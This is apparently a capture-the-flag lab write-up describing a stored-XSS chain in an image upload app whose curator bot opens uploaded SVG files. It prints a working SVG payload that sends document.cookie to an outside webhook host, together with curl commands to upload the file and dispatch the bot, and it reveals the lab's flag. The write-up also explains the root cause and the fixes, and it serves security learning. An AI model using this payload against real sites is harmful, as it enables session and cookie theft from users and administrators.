# InkBleed SVG Upload XSS Curator Bot

## What Is Happening

InkBleed is a small image letterpress. Users upload sheets to `/api/upload`, the files appear in a binder, and a curator bot can be dispatched with `/api/send` to review a specific upload in person.

SVG uploads are stored at `/uploads/{hash}.svg` and served back as `image/svg+xml` without removing inline script. When the curator opens the uploaded file, the script runs in the app origin and can read the admin cookie.

## Why It Happens

The upload path treats SVG as a valid image format but does not strip active content. Because the file is served from the same origin as the app, any JavaScript inside the SVG executes in a first-party context when the browser loads the file directly.

The curator workflow gives attackers a realistic victim: POST `/api/send` with the uploaded hash, and the bot visits the stored file URL.

## Exact Test

Upload SVG payload:

```bash
curl -sS -X POST "https://026f85f17691.pwnbox-lab.com/api/upload" \
  -F "file=@xss.svg;filename=xss.svg;type=image/svg+xml"
```

Example `xss.svg`:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script><![CDATA[
fetch('https://webhook.site/YOUR-UUID?c='+encodeURIComponent(document.cookie));
]]></script>
</svg>
```

Dispatch curator:

```bash
curl -sS -X POST "https://026f85f17691.pwnbox-lab.com/api/send" \
  -H "Content-Type: application/json" \
  -d '{"hash":"YOUR-HASH"}'
```

## Expected Signal

- Upload returns `url` ending in `.svg`.
- `GET /uploads/{hash}.svg` returns the script unchanged.
- `/api/send` returns `{"ok":true}`.
- Webhook receives `FLAG=pwnbox{...}` or another sensitive cookie value.

## Result Interpretation

Confirmed bug chain:

```text
SVG upload accepted
-> active script stored and served from app origin
-> curator bot opens uploaded file
-> JavaScript exfiltrates cookie
```

## Root Cause

Unsafe SVG upload handling plus curator bot rendering of untrusted uploaded content.

## Impact

- Stored XSS against users or review bots.
- Cookie/session theft from curator/admin context.
- Potential same-origin actions if cookies are replayable.

## Fix

- Reject SVG uploads or sanitize them with a strict allowlist.
- Re-encode images server-side and store only normalized output.
- Serve user uploads from an isolated origin without app cookies.
- Mark sensitive cookies `HttpOnly`.

## Key Lesson

Image upload labs with reviewer bots often fall into one of two buckets: SVG active content or PNG polyglot plus object-storage `Content-Type` override. Test SVG first when `.svg` uploads are accepted.

## Flag

`pwnbox{8b3a1d7f4e0c2658a91b4d705ec38c2f}`
